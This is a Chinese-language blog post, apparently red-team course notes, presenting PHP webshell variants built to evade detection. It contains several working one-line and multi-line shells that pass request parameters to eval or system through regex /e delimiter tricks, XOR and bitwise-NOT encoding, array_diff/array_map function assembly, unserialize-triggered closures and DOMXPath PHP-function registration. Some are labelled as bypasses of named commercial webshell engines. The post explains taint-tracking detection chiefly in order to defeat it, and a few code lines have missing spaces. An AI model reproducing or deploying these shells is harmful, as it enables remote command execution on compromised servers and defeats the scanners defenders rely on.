<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-string">&quot;A&quot;</span>); <span class="hljs-variable">$b</span>=&amp;<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]; <span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>; <span class="hljs-variable">$c</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;mem&quot;</span>]]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]; <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>?mem&#x3D;1&amp;cmd&#x3D;phpinfo();<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231951324.png" srcset="/img/loading.gif" lazyload alt="image-20220523195127231"></p>
<h3 id="pcre-get-compiled-regex-cache-函数"><a href="#pcre-get-compiled-regex-cache-函数" class="headerlink" title="pcre_get_compiled_regex_cache 函数"></a>pcre_get_compiled_regex_cache 函数</h3><p>我很快关注到了这个 pcre_get_compiled_regex_cache 函</p>
<p>数，这个函数用于处理 preg_replace 的第一个参数</p>
<p>555.php?2333&#x3D;phpinfo();<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232002424.png" srcset="/img/loading.gif" lazyload alt="image-20220523200242323"></p>
<p>我省略了很多，因为这些代码前面的注释足以说明他们的作用。</p>
<p>第一段注释，说明了解析正则的时候会忽略掉正则前面所有的空白字符</p>
<p>第二段注释，说明delimiter不能是字母、数字或者反斜线。</p>
<p>30delimiter就是正则里的分隔符，比如 &#x2F;.*&#x2F;e 这个正则，它的delimiter是 &#x2F; 。很显然，delimiter是</p>
<p>有两个的，分别是start_delimiter和end_delimiter。</p>
<p>第三段注释，当 start_delimiter &#x3D;&#x3D; end_delimiter 时，分隔符只有一个符号。</p>
<p>第四段注释，当 start_delimiter !&#x3D; end_delimiter 时，分隔符有两个符号。</p>
<p>第四段就是有趣的点了，我们平时日常开发或审计的过程中，通常遇到的正则表达式分隔符，要不就是</p>
<p>斜线 &#x2F; ，要不就是竖线 | ，也有见过井号 # 、波浪线 ~ 之类的，但甭管怎样他们都属于</p>
<p>start_delimiter &#x3D;&#x3D; end_delimiter 这种情况。</p>
<p>但PHP的正则是支持使用“括号”这种成对出现的符号作为分隔符的，只要正则两侧的分隔符能够组成一对都是合法分隔符，比如：</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232005344.png" srcset="/img/loading.gif" lazyload alt="image-20220523200531695">这种比较奇葩的正则表达式分隔符，如果Webshell检测引擎没有正确地进行解析，就有可能被绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;&lt;.*&gt;e&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>]); <br></code></pre></td></tr></table></figure>



<h3 id="以在多个修饰符间，添加一些没意义的空白字符"><a href="#以在多个修饰符间，添加一些没意义的空白字符" class="headerlink" title="以在多个修饰符间，添加一些没意义的空白字符"></a>以在多个修饰符间，添加一些没意义的空白字符</h3><p>实际上是阅读底层函数 pcre_get_compiled_regex_cache 的代码，来到后面一个while循环中：</p>
<p>这个switch语句显然就是用来处理各种修饰符的。</p>
<p>可以观察到，switch里对空格和换行进行了匹配，如果遇到这两个字符直接break忽略，进入下一次循环</p>
<p>也就是说，我们可以在多个修饰符间，添加一些没意义的空白字符，比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;/.*/\ne\n\n is\n &quot;</span>; <br><br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>]); <br></code></pre></td></tr></table></figure>

<p>666.php?2333&#x3D;phpinfo();</p>
<h3 id="RegexIterator-这个类"><a href="#RegexIterator-这个类" class="headerlink" title="RegexIterator 这个类"></a>RegexIterator 这个类</h3><p>这个SPL类用于将一个普通迭代器变成一个具有正则功能的迭代</p>
<p>器。而正则的模式、方法等都是可以在这个类对象中指定的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$i</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegexIterator</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>]), <span class="hljs-string">&#x27;/.*/e&#x27;</span>, <br><br><span class="hljs-title class_">RegexIterator</span>::<span class="hljs-variable constant_">REPLACE</span>); <br><br><span class="hljs-variable">$i</span>-&gt;replacement = <span class="hljs-string">&#x27;$0&#x27;</span>; <br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$i</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$a</span>) &#123;&#125; <br></code></pre></td></tr></table></figure>

<p>这种是连不了的 因为这个函数没有回显 request就是在封装的时候用的  当get和post 不能用的时候可以用request </p>
<p>如果你要当成连接的话 就需要使用eval 那就要做eval的免杀 那还用这个干嘛</p>
<h3 id="666-php-多重异或"><a href="#666-php-多重异或" class="headerlink" title="666.php  多重异或"></a>666.php  多重异或</h3><p>PHP代码下面的“^”是异或运算符，按二进制位进行异或运算（XOR）</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>^ <span class="hljs-number">0</span> = <span class="hljs-number">0</span>;<br><span class="hljs-symbol">1 </span>^ <span class="hljs-number">1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-symbol">0 </span>^ <span class="hljs-number">1</span> = <span class="hljs-number">1</span>; <br><span class="hljs-symbol">1 </span>^ <span class="hljs-number">0</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<p> C:\Users\e’e’t\Desktop\红队安全开发\免杀马的制作\php\备课\20220523写\666.php<br> 多次异或过waf 基本上配合其他方式二次开发 都能<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241604615.png" srcset="/img/loading.gif" lazyload alt="image-20220524160427493"></p>
<h3 id="按位取反"><a href="#按位取反" class="headerlink" title="按位取反"></a>按位取反</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241612509.png" srcset="/img/loading.gif" lazyload alt="image-20220524161253443"></p>
<p>这么明显的一句话 只爆了一级。<br> 我们在随便加个函数调用一下<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241614659.png" srcset="/img/loading.gif" lazyload alt="image-20220524161427601"></p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241634454.png" srcset="/img/loading.gif" lazyload alt="image-20220524163432377"></p>
<ul>
<li><h4 id="2-momek9fW的对应base64解密值为：eval-，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以-GET-0-为空。2-base加密的那一串是作为后面完整的php语句来执行的，结束得加一个-，不然会报错。这样改：echo-base64-encode-’eval-GET-0-’-除了一些小细节作者没处理好之外，单论免杀思路还是不错的。"><a href="#2-momek9fW的对应base64解密值为：eval-，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以-GET-0-为空。2-base加密的那一串是作为后面完整的php语句来执行的，结束得加一个-，不然会报错。这样改：echo-base64-encode-’eval-GET-0-’-除了一些小细节作者没处理好之外，单论免杀思路还是不错的。" class="headerlink" title="2.momek9fW的对应base64解密值为：eval()，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以$_GET[0]为空。2.base加密的那一串是作为后面完整的php语句来执行的，结束得加一个;，不然会报错。这样改：echo(base64_encode(~’eval($_GET[0]);’));除了一些小细节作者没处理好之外，单论免杀思路还是不错的。"></a>2.momek9fW的对应base64解密值为：eval()，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以$_GET[0]为空。2.base加密的那一串是作为后面完整的php语句来执行的，结束得加一个;，不然会报错。这样改：echo(base64_encode(~’eval($_GET[0]);’));除了一些小细节作者没处理好之外，单论免杀思路还是不错的。</h4></li>
</ul>
<p>单纯知识因为D盾更新遇到base加密的都会报错 那么完全可以配合其它方法 或者使用自己写的加密解密脚本</p>
<p>最后在放到加密网站加密一下就行</p>
<h1 id="20220811补充"><a href="#20220811补充" class="headerlink" title="20220811补充"></a>20220811补充</h1><p>现如今的情况下，传统的Webshell检测对于0day样本的检测效率已经不是特别好了，所以这时候就需要一种”主动”的检测方式，能够让引擎主动去理解脚本、分析样本，发现样本中的恶意行为，而不是依靠人工来添加Webshell特征。</p>
<p>1、污点追踪</p>
<p>举个例子，对于一个Webshell来说，如果要进行任意命令执行，就一定要获取外界数据，对于PHP来说也就是$_GET、$_POST来接受数据，而要想任意命令执行，这些接收到的数据也就一定要最终传递到eval、system等函数中，而<strong>污点追踪</strong>技术就是利用这一点，如果样本中的外界变量通过不断传递，最终进入到危险函数中，那基本上就可以断定为Webshell，将外界变量视为污点源，危险函数视为污点汇聚点，跟踪污点传播过程，判断污点变量是否被洗白，最终是否进入污点汇聚点，画一个流程图如下：</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111049430.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>2、词法分析</p>
<p>检测引擎会将各种脚本语言进行词法语法分析，然后构建控制流图和数据流图，并在图上跟踪外界污点变量的传递，使用外界变量是WebShell非常重要的特征，如果发现外界变量最终进入了命令执行函数，就可以判断为Webshell。</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111049452.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>我们要知道原理就可以想办法如何“蒙骗“住检测引擎，如果大家研究过，或者说亲身参与到了bypass挑战赛中，就能感受到无论是动静态还是什么技术，最后都是根据污点追踪法则来进行检测，污点追踪的流程在上一节提到了，目前我们有两个方法：</p>
<p>1、利用PHP中其他的命令执行的方法，让检测引擎识别不出这是污点汇集点</p>
<p>2、打断污点追踪的过程，让污点汇集点不落地</p>
<p>前面的很多下项目也是根据这两个方法</p>
<h2 id="样本一"><a href="#样本一" class="headerlink" title="样本一"></a>样本一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//ASRC伏魔引擎bypass</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">array_diff</span>([<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;ys&quot;</span>,<span class="hljs-string">&quot;te&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>],[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>]);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$a</span>,(<span class="hljs-keyword">array</span>)<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>首先我们需要利用技巧（PHP本身的特性），来阻断污点追踪的过程，我在fuzz测试的时候发现了array_map()这个函数&#x3D;&#x3D;存在callback并且能够逃避检测&#x3D;&#x3D;</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111053866.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>那么首先的能够bypass的污点汇集点已经有了&#x3D;&#x3D;，接下里来就是寻找其他函数来将变量”洗白&#x3D;&#x3D;”，我选择了array_diff()<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111054436.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>这样就可以&#x3D;&#x3D;利用该函数拼凑出一个system函数&#x3D;&#x3D;，再&#x3D;&#x3D;利用array_map()的callback&#x3D;&#x3D;&#x3D;&#x3D;来做命令执行&#x3D;&#x3D;</p>
<p>这样就完成了最简单的一次bypass</p>
<h2 id="样本2"><a href="#样本2" class="headerlink" title="样本2"></a><em>样本2</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//bypass 牧云 文件名需要设置为system</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-keyword">__FILE__</span>,-<span class="hljs-number">10</span>,<span class="hljs-number">6</span>);<br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$filename</span>(<span class="hljs-variable">$command</span>);<br></code></pre></td></tr></table></figure>

<p>__FILE__是PHP的一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名，我们利用substr()函数逆着截取，就能获得system再利用变量做函数的方式，打断了污点追踪的过程，进行命令执行，也可以成功bypass掉牧云引擎。</p>
<h2 id="样本3"><a href="#样本3" class="headerlink" title="样本3"></a><em>样本3</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//bypass 牧云 and TAV反病毒引擎+洋葱恶意代码检测引擎</span><br>classA&#123;<br>    <span class="hljs-title function_ invoke__">publicfunction__construct</span>()&#123;&#125;<br><br>    <span class="hljs-title function_ invoke__">publicfunction__wakeup</span>()&#123;<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">array_diff</span>([<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;ys&quot;</span>,<span class="hljs-string">&quot;te&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>],[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>]);<br>        <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-title class_">Closure</span>::<span class="hljs-title function_ invoke__">fromCallable</span>(<span class="hljs-variable">$a</span>)-&gt;<span class="hljs-title function_ invoke__">__invoke</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>]);<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:10:&quot; A comment&quot;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>这个套了一层反序列化，隐藏污点汇集点的方法与样本一相同，利用数组差级构造system后利用原生类Closure的fromCallable函数</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111059750.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>进行命令执行（在牧云中array_diff([“s”,”a”,”b”,”ys”,”te”,”m”],[“a”,”b”]);这种方式会被check，索性换成动态控制，这样也能打断污点追踪）</p>
<h2 id="样本4"><a href="#样本4" class="headerlink" title="样本4"></a><em>样本4</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// dom and xml needed, install php-xml and leave php.ini as default.</span><br><span class="hljs-comment">// Author:LemonPrefect</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">3</span>];<br><span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>] =<span class="hljs-string">&quot;//book[php:functionString(&#x27;system&#x27;, &#x27;<span class="hljs-subst">$cmd</span>&#x27;) = &#x27;PHP&#x27;]&quot;</span>;<br><span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>] = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;http://php.net/xpath&quot;</span>];<br><span class="hljs-variable">$xml</span>=<span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;books&gt;</span><br><span class="hljs-string">    &lt;book&gt;</span><br><span class="hljs-string">        &lt;title&gt;We are the championstitle&gt;</span><br><span class="hljs-string">        &lt;author&gt;LemonPrefectauthor&gt;</span><br><span class="hljs-string">        &lt;author&gt;H3h3QAQauthor&gt;</span><br><span class="hljs-string">    book&gt;</span><br><span class="hljs-string">books&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$doc</span>=newDOMDocument;<br><span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>);<br><span class="hljs-variable">$clazz</span>= (<span class="hljs-title function_ invoke__">newReflectionClass</span>(<span class="hljs-string">&quot;DOMXPath&quot;</span>));<br><span class="hljs-variable">$instance</span>=<span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">newInstance</span>(<span class="hljs-variable">$doc</span>);<br><span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">getMethod</span>(<span class="hljs-string">&quot;registerNamespace&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">getClosure</span>(<span class="hljs-variable">$instance</span>)-&gt;<span class="hljs-title function_ invoke__">__invoke</span>(...<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">getMethod</span>(<span class="hljs-string">&quot;registerPHPFunctions&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">invoke</span>(<span class="hljs-variable">$instance</span>);<br><span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">getMethod</span>(<span class="hljs-string">&quot;query&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">getClosure</span>(<span class="hljs-variable">$instance</span>)-&gt;<span class="hljs-title function_ invoke__">__invoke</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br><br></code></pre></td></tr></table></figure>

<p>该样本需要一些条件，前提是开启了php-xml拓展才可以，其原理就是用XML去注册一个registerPHPFunctions，也就是我们想要执行的system再利用getClosure去触发该方法而构成的webshell，其中即利用到了PHP的特性，利用registerNamespace和registerPHPFunctions来中断污点追踪，从而RCE</p>
<p>&#x3D;&#x3D;打断污点追踪前执行函数就要设定好,之后再拼接&#x3D;&#x3D;</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/php-webshell/" class="category-chain-item">php webshell</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>phpwebshell从基础到深入变种</div>
      <div>http://example.com/2022/08/18/phpwebshell从基础到深入变种/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>CDxiaodong</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 18, 2022</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/08/26/kali%E5%85%A8%E9%83%A8%E8%BD%AF%E4%BB%B6%E4%BB%8B%E7%BB%8D/" title="kali全部软件介绍">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">kali全部软件介绍</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/08/15/%E9%92%93%E9%B1%BC%E6%89%8B%E6%B3%95%E6%8A%A5%E5%91%8A-CD/" title="钓鱼手法报告-CD">
                        <span class="hidden-mobile">钓鱼手法报告-CD</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>CD</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>XD</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
